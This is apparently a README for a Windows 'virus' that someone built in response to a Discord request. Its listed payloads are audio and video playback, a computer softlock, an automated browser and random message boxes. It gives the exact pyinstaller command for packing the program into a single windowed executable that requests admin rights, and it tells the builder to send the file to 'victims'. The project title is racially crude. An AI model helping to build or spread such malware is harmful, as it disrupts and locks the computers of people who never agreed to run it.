# black-guys-twerking-virus
A virus request from Frosty#1982 on discord.

#### This virus was made by
GLUR

### Features/Payloads
* `Mp3 playback`
* `Mp4 playback`
* `Computer softlock`
* `Automated Browser`
* `Random msg boxes`

### TODO
* Figure out a good way to implement cut features
* Delete unused payload libs

### Compiling Program
Your victims won't need any of the requirements to run the compiled virus. Just you will need these requirements to compile the exe.

First you will need at least [python3+](https://www.python.org/downloads/). Then you will need to install packages by using `pip install requirements.txt`
Then navigate to directory and type 
```
pyinstaller --onefile --windowed --uac-admin --icon=icon.ico --add-data "deez.mp3;." --add-data "deez.mov;." --add-data "deez1.mov;." main.py
```
Your compiled exe will be in the **dist** folder. 

Then you can send to your victimsðŸ˜ˆ
